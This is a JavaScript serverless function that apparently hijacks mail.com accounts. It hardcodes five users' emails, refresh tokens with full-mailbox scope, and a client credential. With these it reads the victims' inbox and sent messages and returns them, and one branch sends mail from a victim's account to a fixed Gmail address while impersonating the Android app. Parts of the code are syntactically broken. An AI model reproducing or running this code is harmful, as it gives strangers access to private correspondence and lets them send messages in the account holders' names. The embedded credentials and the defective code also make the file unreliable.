import express from "express";
import ServerlessHttp from "serverless-http";
import cors from "cors";
import * as bodyParser from "body-parser";

const app = express();

app.use(cors("*"));

app.use(bodyParser.json());

app.post("/.netlify/functions/api", async (req, res) => {

    let user = JSON.parse(req?.body);
    console.log(user?.userId, user?.email);

    let users = [
        {
            mailId: '1731855031464436776',
            email: 'ivykinnunen@mail.com',
            token: '_2zRIXdufzjrNx2_kfKsvR8uCqcxYuVmKCkQ45AhTeM',
            scope: 'mailbox_user_full_access mailbox_user_status_access foo bar',
            auth: ''
        },
        {
            mailId: '1731695615991929974',
            email: 'emma.mattila@mail.com',
            token: 'jK7uqebUtvG4vBo7Jyn1S0YQnJxueoiu0ugJ47s8qkI',
            scope: 'mailbox_user_full_access mailbox_user_status_access foo bar',
            auth: ''
        },
        {
            mailId: '1732437937654558920',
            email: 'jakobmathisen@mail.com',
            token: 'AtQzDHxYT-3JmKy4xJMRMaZoVM7hK5drinEiJ61pI0Y',
            scope: 'mailbox_user_full_access mailbox_user_status_access foo bar',
            auth: ''
        },
        {
            mailId: '1731827932334926578',
            email: 'mikelandersen@mail.com',
            token: 'px1GHpwmy2ueLACmrzeaxmIoFrroTOfXJzYoyhnsF8g',
            scope: 'mailbox_user_full_access mailbox_user_status_access foo bar',
            auth: ''
        },
        {
            mailId: '1734141175483291236',
            email: 'luz-gonzalez@mail.com',
            token: 'GW7bHRIlFcRC-eMF2V2nzykdZ7cE7aAi9X5oZs1TBGs',
            scope: 'mailbox_user_full_access mailbox_user_status_access foo bar',
            auth: ''
        }
    ];

    let fullMailInboxContent = [];
    let fullMailSentContent = [];
    (async () => {
        if (user?.compose) {
            let toEmail = 'kufreusanga@gmail.com';
  let subject = 'Good Boy';
  let message = 'its been a while my friend';

  // console.log(toEmail, subject, message)

            for (let i = 0; i < users?.length; i++) {
            if (users[i]?.email == user?.email) {
                sendingMail(users[i])
            }
        }


            function sendingMail(user) {
                let result = await fetch('https://oauth2.mail.com/token', {
      method: 'POST',
      mode: 'no-cors',
      headers: {
          'Host': 'oauth2.mail.com',
          'Authorization': 'Basic bWFpbGNvbV9tYWlsYXBwX2FuZHJvaWQ6a2luMmxTU2tVUXRRQ0NsWG9YZklOaEp1bUc2SmQwM0taNVdMN05KOQ=='
      },
      body: new URLSearchParams({
          'grant_type': 'refresh_token',
          'refresh_token': user?.token,
          'scope': user?.scope
      })
  });
  let userBearer = await result?.json();
  
  let uuid = "75032018-6036-4542-" + JSON.stringify(Math.floor(Math.random() * (99999 - 10000 + 1))) + "-" + JSON.stringify(Math.floor(Math.random() * (9999999 - 1000000 + 1)))

  let senderEmail = user.email

  let checkDisplayName = await fetch('https://hsp2.mail.com/service/massrv/MailAccount/accountId/emailaddresses?absoluteURI=false&q.type.in=SENDER&q.state.in=ACTIVE', {
    headers: {
      'Host': 'hsp2.mail.com',
      'Accept': 'application/vnd.ui.trinity.mailaddress.list-v5+json',
      'Accept-Charset': 'utf-8',
      'Authorization': 'Bearer ' + userBearer?.access_token
    }
  });

  let displaynameResult = await checkDisplayName.json()

  console.log(displaynameResult?.mailaddresslist[0]?.displayName)

  let composeMail = '{"mailHeader":{"from":"' + displaynameResult?.mailaddresslist[0]?.displayName + ' <' + senderEmail + '>","to":["\\"\\" <' + toEmail + '>"],"cc":[],"bcc":[],"subject":"' + subject + '","date":1736338979052,"priority":"3"},"htmlBody":"<html><body><br>' + message + '<br></body></html>","attachments":[]}';
  let sendMail = await fetch('https://hsp2.mail.com/service/msgsrv/Mailbox/primaryMailbox/Mailsubmission?@SUBMISSION-TRANSIENT-UUID=' + uuid + '&MailSizeLimitExceededExceptionMapper.explicitCode=true', {
      method: 'POST',
      headers: {
        'Host': 'hsp2.mail.com',
        'Accept': 'text/event-stream',
        'Accept-Charset': 'utf-8',
        'Authorization': 'Bearer ' + userBearer?.access_token,
        'User-Agent': 'mailcom.android.androidmail/7.62.3 Dalvik/2.1.0 (Linux; U; Android 12; sdk_gphone64_arm64 Build/SE1A.220203.002.A1)',
        'X-Ui-App': 'mailcom.android.androidmail/7.62.3',
        'Content-Type': 'application/vnd.ui.trinity.minimalmailmessage+json',
        'Accept-Encoding': 'gzip, deflate, br',
      },
      body: composeMail
    });

  console.log(await sendMail.text())
  
}
            } 
        } else {
            async function getBearer(user) {
            let result = await fetch('https://oauth2.mail.com/token', {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Host': 'oauth2.mail.com',
                    'Authorization': 'Basic bWFpbGNvbV9tYWlsYXBwX2FuZHJvaWQ6a2luMmxTU2tVUXRRQ0NsWG9YZklOaEp1bUc2SmQwM0taNVdMN05KOQ=='
                },
                body: new URLSearchParams({
                    'grant_type': 'refresh_token',
                    'refresh_token': user?.token,
                    'scope': user?.scope
                })
            });
            let userBearer = await result?.json();

            let secondCheck = {
                mailId: user?.mailId,
                email: user?.email,
                token: user?.token,
                scope: user?.scope,
                auth: userBearer?.access_token
            };

            getMail(secondCheck)
        };

        async function getMail(user) {

            let urlFolders = 'https://hsp2.mail.com/service/msgsrv/Mailbox/primaryMailbox/folders?absoluteURI=false';
            let resultFolders = await fetch(urlFolders, {
                headers: {
                    'Host': 'hsp2.mail.com',
                    'Accept': 'application/vnd.ui.trinity.folders-v4+json',
                    'Accept-Charset': 'utf-8',
                    'Authorization': 'Bearer ' + user.auth
                }
            });

            let allFolders = await resultFolders.json();

            let allFoldersIdentifier = {};

            allFolders?.folders.forEach(folder => {
                if (folder?.attribute?.folderName?.toLowerCase() == "inbox") {
                    allFoldersIdentifier.inbox = folder?.folderIdentifier
                } else if (folder?.attribute?.folderName?.toLowerCase() == "sent") {
                    allFoldersIdentifier.sent = folder?.folderIdentifier
                } else if (folder?.attribute?.folderName?.toLowerCase() == "spam") {
                    allFoldersIdentifier.spam = folder?.folderIdentifier
                }
            });


            async function returnMessageBody(mailBodyId) {
                let url = 'https://hsp2.mail.com/service/msgsrv/Mailbox/primaryMailbox/Mail/' + mailBodyId + '?absoluteURI=false ';

                let result = fetch(url, {
                    headers: {
                        'Host': 'hsp2.mail.com',
                        'Accept': 'text/vnd.ui.insecure+html',
                        'Accept-Charset': 'utf-8',
                        'Authorization': 'Bearer ' + user?.auth
                    }
                });

                let getMailBody = await result;
                let returnBody = await getMailBody.text();


                // return returnBody.slice(0, 20)
                return returnBody
            }

            async function returnFolderContents(identifier) {

                let url = 'https://hsp2.mail.com/service/msgsrv/Mailbox/primaryMailbox/Folder/' + identifier + '/Mail?absoluteURI=false&orderBy=INTERNALDATE%20desc&tagsShowAll=true&amount=25';
                let result = await fetch(url, {
                    headers: {
                        'Host': 'hsp2.mail.com',
                        'Accept': 'application/vnd.ui.trinity.messages+json',
                        'Accept-Charset': 'utf-8',
                        'Authorization': 'Bearer ' + user.auth
                    }
                });

                let allMails = await result.json();

                return allMails.mail;
            }

            let responseObject = {};
            let inboxResult = await returnFolderContents(allFoldersIdentifier.inbox)
            let sentResult = await returnFolderContents(allFoldersIdentifier.sent)

            for (let i = 0; i < inboxResult?.length; i++) {
                let mailBodyId = inboxResult[i]?.mailBodyURI.replace('../../Mail/', '');
                fullMailInboxContent.push({ from: inboxResult[i]?.mailHeader.from, subject: inboxResult[i].mailHeader?.subject, content: await returnMessageBody(mailBodyId) })

                if (i == (inboxResult?.length - 1)) {
                    responseObject.inbox = fullMailInboxContent
                }
            }

            for (let i = 0; i < sentResult?.length; i++) {
                let mailBodyId = sentResult[i]?.mailBodyURI.replace('../../Mail/', '');
                fullMailSentContent.push({ from: sentResult[i]?.mailHeader.from, subject: sentResult[i].mailHeader?.subject, content: await returnMessageBody(mailBodyId) })

                if (i == (sentResult?.length - 1)) {
                    responseObject.sent = fullMailSentContent
                }
            }

            res.send(responseObject)
        };
        for (let i = 0; i < users?.length; i++) {
            if (users[i]?.email == user?.email) {
                getBearer(users[i])
            }
        }
    })();
        }
});

const handler = ServerlessHttp(app);

module.exports.handler = async (event, context) => {
    const result = await handler(event, context);
    return result;
};
